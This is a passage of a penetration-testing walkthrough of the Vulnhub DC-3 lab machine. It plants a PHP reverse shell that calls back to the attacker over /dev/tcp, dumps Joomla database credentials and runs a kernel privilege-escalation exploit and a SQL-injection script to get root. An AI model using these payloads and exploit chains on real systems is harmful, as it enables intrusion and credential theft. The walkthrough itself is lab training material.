Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
It looks like the password is `snoopy`. We have to add them to our notes.
```password
snoopy
```

Let's open the website in the browser.
![Image](/assets/img/WriteUp/Vulnhub/DC3/Pasted image 20230327093938.png){: width="700" height="400" }

Now navigate to the administrator panel.
![Image](/assets/img/WriteUp/Vulnhub/DC3/Pasted image 20230327094022.png){: width="700" height="400" }

So let's try to signin with `admin:snoopy` to the administrator panel.
![Image](/assets/img/WriteUp/Vulnhub/DC3/Pasted image 20230327094129.png){: width="700" height="400" }

It worked! Now we have to find a way to gain a shell via Joomla. It probably has to do something with a PHP reverse webshell.

Let's change the template (theme).
Click on `Extensions` => `Templates` => `Templates` 
![Image](/assets/img/WriteUp/Vulnhub/DC3/Pasted image 20230327100553.png){: width="700" height="400" }

A list with templates are shown to us.
![Image](/assets/img/WriteUp/Vulnhub/DC3/Pasted image 20230327100646.png){: width="700" height="400" }

Click on `Beez3 Details and Files` to open the template.

![Image](/assets/img/WriteUp/Vulnhub/DC3/Pasted image 20230327100836.png){: width="700" height="400" }

Click on `index.php` to edit this template.
Start a netcat listener on port 53.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ sudo nc -lvp 53                 
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53

```
Add the following piece of code to start a reverse webshell:
```PHP
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.15/53 0>&1'");?>
```
Now click the `Save` button, followed by a click on the `Template Preview` button.
![Image](/assets/img/WriteUp/Vulnhub/DC3/Pasted image 20230327101424.png){: width="700" height="400" }




------
## Initial access
Go back to the netcat listener.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ sudo nc -lvp 53                 
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.0.2.32.
Ncat: Connection from 10.0.2.32:56044.
bash: cannot set terminal process group (1219): Inappropriate ioctl for device
bash: no job control in this shell
www-data@DC-3:/var/www/html$ 

```
Yes, we got a reverse shell working. Since we got an initial foothold we have to enumerate the basic information first.
```bash
www-data@DC-3:/var/www/html$ whoami;id;hostname
whoami;id;hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
DC-3
```
So we are www-data and working on DC-3. Now let's check our working direcotry.
```bash
www-data@DC-3:/var/www/html$ pwd
pwd
/var/www/html
```
We are working in `/var/www/html`. Let's check some file within this directory.
```bash
www-data@DC-3:/var/www/html$ ls
ls
LICENSE.txt
README.txt
administrator
bin
cache
cli
components
configuration.php
htaccess.txt
images
includes
index.php
language
layouts
libraries
media
modules
plugins
robots.txt.dist
templates
tmp
web.config.txt
www-data@DC-3:/var/www/html$ 

```
A file called `configuration.php` always sounds interesting. In those file new credentials can be found.
```bash
www-data@DC-3:/var/www/html$ cat configuration.php
cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'DC-3';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'squires';
        public $db = 'joomladb';
        public $dbprefix = 'd8uea_';
        public $live_site = '';
        public $secret = '7M6S1HqGMvt1JYkY';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'freddy@norealaddress.net';
        public $fromname = 'DC-3';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'A website for DC-3';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}
www-data@DC-3:/var/www/html$ 

```

Based on the information we have to add the following information to our notes:
* Database user: root
* Database password: squires
* Secret: `7M6S1HqGMvt1JYkY`

Now let's enumerate some information about the Linux distro.
```bash
www-data@DC-3:/var/www/html$ uname -a
uname -a
Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
www-data@DC-3:/var/www/html$ uname -mrs
uname -mrs
Linux 4.4.0-21-generic i686
www-data@DC-3:/var/www/html$ cat /proc/version
cat /proc/version
Linux version 4.4.0-21-generic (buildd@lgw01-06) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016
www-data@DC-3:/var/www/html$ cat /etc/issue
cat /etc/issue
Ubuntu 16.04 LTS \n \l

www-data@DC-3:/var/www/html$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
NAME="Ubuntu"
VERSION="16.04 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
UBUNTU_CODENAME=xenial
www-data@DC-3:/var/www/html$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 16.04 LTS
Release:        16.04
Codename:       xenial
www-data@DC-3:/var/www/html$ 

```
Bases on this information we could look if there is a kernel exploit available for privilege escaltion.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ searchsploit linux 4.4 ubuntu 16.04 privilege escalation
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                                                                                                                           | linux/local/40759.rb
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                                                                                                          | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege Escalation                                                                                                   | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privilege Escalation                                                                                               | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation                                                                                                              | linux/local/39772.txt
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                                                                    | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                                                                         | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                                                                     | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                                                                 | linux/local/47169.c
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```
Let's copy exploit `39772` to the working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ searchsploit -m 39772                                   
  Exploit: Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation
      URL: https://www.exploit-db.com/exploits/39772
     Path: /usr/share/exploitdb/exploits/linux/local/39772.txt
    Codes: CVE-2016-4557, 823603
 Verified: True
File Type: C source, ASCII text
Copied to: /home/emvee/Documents/Vulnhub/DC-3/39772.txt

```
Now we have to read the exploit details before using this exploit.
After reading the file, we got the information to us that we should download an archive from here: `https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip`. Let's download it to our working directory.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip  
--2023-03-27 10:44:15--  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
Resolving gitlab.com (gitlab.com)... 172.65.251.78, 2606:4700:90:0:f22e:fbec:5bed:a9b9
Connecting to gitlab.com (gitlab.com)|172.65.251.78|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7025 (6.9K) [application/octet-stream]
Saving to: ‘39772.zip’

39772.zip                                                  100%[========================================================================================================================================>]   6.86K  --.-KB/s    in 0.001s  

2023-03-27 10:44:16 (8.16 MB/s) - ‘39772.zip’ saved [7025/7025]

```
Now let's transfer this file to the target. We have to setup a python webserver.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ sudo python3 -m http.server 80  
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Change the working directory to `/tmp` and download the file with `wget`.
```bash
www-data@DC-3:/var/www/html$ cd /tmp
cd /tmp
www-data@DC-3:/tmp$ wget http://10.0.2.15/39772.zip
wget http://10.0.2.15/39772.zip
--2023-03-27 18:53:34--  http://10.0.2.15/39772.zip
Connecting to 10.0.2.15:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7025 (6.9K) [application/zip]
Saving to: '39772.zip'

     0K ......                                                100% 1.57G=0s

2023-03-27 18:53:34 (1.57 GB/s) - '39772.zip' saved [7025/7025]

www-data@DC-3:/tmp$ 

```

Now we have to extract the ZIP archive.
```bash
www-data@DC-3:/tmp$ unzip 39772.zip
unzip 39772.zip
Archive:  39772.zip
   creating: 39772/
  inflating: 39772/.DS_Store         
   creating: __MACOSX/
   creating: __MACOSX/39772/
  inflating: __MACOSX/39772/._.DS_Store  
  inflating: 39772/crasher.tar       
  inflating: __MACOSX/39772/._crasher.tar  
  inflating: 39772/exploit.tar       
  inflating: __MACOSX/39772/._exploit.tar  
www-data@DC-3:/tmp$ 

```
Let's check the directory.
```bash
www-data@DC-3:/tmp$ ls
ls
39772
39772.zip
__MACOSX
systemd-private-3957db5ed5ad43cfb743de0226f28ede-systemd-timesyncd.service-yld5RA
www-data@DC-3:/tmp$ 
```
The file extracted and a new directory has been made. We have to change the working directory and look for the files what have been extracted.
```bash
www-data@DC-3:/tmp$ cd 39772
cd 39772
www-data@DC-3:/tmp/39772$ ls -la
ls -la
total 48
drwxr-xr-x  2 www-data www-data  4096 Aug 16  2016 .
drwxrwxrwt 10 root     root      4096 Mar 27 18:54 ..
-rw-r--r--  1 www-data www-data  6148 Aug 16  2016 .DS_Store
-rw-r--r--  1 www-data www-data 10240 Aug 16  2016 crasher.tar
-rw-r--r--  1 www-data www-data 20480 Aug 16  2016 exploit.tar
www-data@DC-3:/tmp/39772$ 

```

There are two TAR archives in the exploit directory. Let's extract `exploit.tar`.
```bash
www-data@DC-3:/tmp/39772$ tar xvf exploit.tar
tar xvf exploit.tar
ebpf_mapfd_doubleput_exploit/
ebpf_mapfd_doubleput_exploit/hello.c
ebpf_mapfd_doubleput_exploit/suidhelper.c
ebpf_mapfd_doubleput_exploit/compile.sh
ebpf_mapfd_doubleput_exploit/doubleput.c
www-data@DC-3:/tmp/39772$ 

```
Now let's check the current working directory.
```bash
www-data@DC-3:/tmp/39772$ ls
ls
crasher.tar
ebpf_mapfd_doubleput_exploit
exploit.tar
```
The archive have been extracted, now we have to change the working directory to the directory with the exploit files.
```bash
www-data@DC-3:/tmp/39772$ cd ebpf_mapfd_doubleput_exploit
cd ebpf_mapfd_doubleput_exploit
www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls
ls
compile.sh
doubleput.c
hello.c
suidhelper.c
```
Let's check the file `compile.sh` before running it.
```bash
www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ cat compile.sh
cat compile.sh
#!/bin/sh
gcc -o hello hello.c -Wall -std=gnu99 `pkg-config fuse --cflags --libs`
gcc -o doubleput doubleput.c -Wall
gcc -o suidhelper suidhelper.c -Wall

www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ 

```
Let's compile the exploit.
```bash
www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh
./compile.sh
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$
```
Now let's check if the exploit have been compiled.
```bash
www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls -la
ls -la
total 60
drwxr-x--- 2 www-data www-data  4096 Mar 27 19:05 .
drwxr-xr-x 3 www-data www-data  4096 Mar 27 19:01 ..
-rwxr-x--- 1 www-data www-data   155 Apr 26  2016 compile.sh
-rwxr-xr-x 1 www-data www-data 12336 Mar 27 19:05 doubleput
-rw-r----- 1 www-data www-data  4188 Apr 26  2016 doubleput.c
-rwxr-xr-x 1 www-data www-data  8028 Mar 27 19:05 hello
-rw-r----- 1 www-data www-data  2186 Apr 26  2016 hello.c
-rwxr-xr-x 1 www-data www-data  7524 Mar 27 19:05 suidhelper
-rw-r----- 1 www-data www-data   255 Apr 26  2016 suidhelper.c

```


## Privilege escalation
Everything is ready! Let's rock and roll!

```bash
www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root),33(www-data)
DC-3
```
Since we are root we can capture all the information we need just like for a screenshot on the OSCP exam.
```bash
cd /root
ls
the-flag.txt
whoami;id;hostname;ifconfig;cat the-flag.txt
root
uid=0(root) gid=0(root) groups=0(root),33(www-data)
DC-3
eth0      Link encap:Ethernet  HWaddr 08:00:27:10:91:0b  
          inet addr:10.0.2.32  Bcast:10.0.2.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe10:910b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:212919 errors:0 dropped:0 overruns:0 frame:0
          TX packets:226916 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:25149524 (25.1 MB)  TX bytes:85524047 (85.5 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:277 errors:0 dropped:0 overruns:0 frame:0
          TX packets:277 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:23348 (23.3 KB)  TX bytes:23348 (23.3 KB)

 __        __   _ _   ____                   _ _ _ _ 
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
                                                     

Congratulations are in order.  :-)

I hope you've enjoyed this challenge as I enjoyed making it.

If there are any ways that I can improve these little challenges,
please let me know.

As per usual, comments and complaints can be sent via Twitter to @DCAU7

Have a great day!!!!

```


## Alternative 1 - SQL Injection with python exploit
Since SQLmap is not allowed during the OSCP exam I was looking for an alternative located on github.
```
https://www.google.com/search?q=joomla+3.7+github+exploit
```
I've found the following Github with a working exploit.
```
https://github.com/stefanlucas/Exploit-Joomla
```
Clone the exploit to our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ git clone https://github.com/stefanlucas/Exploit-Joomla.git
Cloning into 'Exploit-Joomla'...
remote: Enumerating objects: 8969, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 8969 (delta 0), reused 0 (delta 0), pack-reused 8965
Receiving objects: 100% (8969/8969), 11.81 MiB | 10.89 MiB/s, done.
Resolving deltas: 100% (1922/1922), done.
```
Change to the working directory to the exploit directory.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3]
└─$ cd Exploit-Joomla 
```
Now check the files
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3/Exploit-Joomla]
└─$ ll
total 12
-rw-r--r-- 1 emvee emvee 6040 Mar 27 11:14 joomblah.py
-rw-r--r-- 1 emvee emvee  196 Mar 27 11:14 README.md
```
Read the instruction of the exploit before running it!
Then run the exploit.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-3/Exploit-Joomla]
└─$ python joomblah.py http://10.0.2.32 
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: d8uea_users
  -  Found table: users
  -  Extracting users from d8uea_users
 [$] Found user [u'629', u'admin', u'admin', u'freddy@norealaddress.net', u'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu', u'', u'']
  -  Extracting sessions from d8uea_session
 [$] Found session [u'629', u'qavctc2agv47m995j0v1iltnp3', u'admin']
  -  Extracting users from users
  -  Extracting sessions from session

```
The hash has been extracted for the admin user. Now continue with the normal exploitation for a reverse PHP webshell.